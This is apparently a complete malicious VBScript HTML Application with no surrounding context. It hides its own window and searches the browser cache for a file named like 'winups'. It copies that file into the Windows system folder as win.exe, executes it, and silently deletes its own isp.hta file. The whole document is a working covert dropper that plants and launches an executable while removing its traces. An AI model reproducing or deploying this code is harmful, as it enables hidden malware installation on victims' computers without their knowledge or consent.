<script LANGUAGE="VBScript">
on error resume next
window.moveTo  -100,-100
window.resizeTo 0,0 
dim exepath
Function Search(objFolder) 
Dim objSubFolder
For Each objFile in objFolder.Files
If InStr(1, objfile.name, "winups", vbtextcompare) then
set filecp = objg_fso.getfile(objfile.path)
filecp.copy (exepath)
exit for
End If
Next 
For Each objSubFolder in objFolder.SubFolders  
Search objSubFolder
Next
End Function
Set objg_fso = CreateObject("Scripting.FileSystemObject")
str=WSH.regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\cache")
set tempfolder = objg_fso.getfolder(str)
set othisfolder = objg_fso.GetSpecialFolder(1)
exepath=othisfolder.path & "\win.exe"
search tempfolder
wsh.run (exepath)
wsh.run "command.com /c del c:\isp.hta" ,0
window.close()
</script>
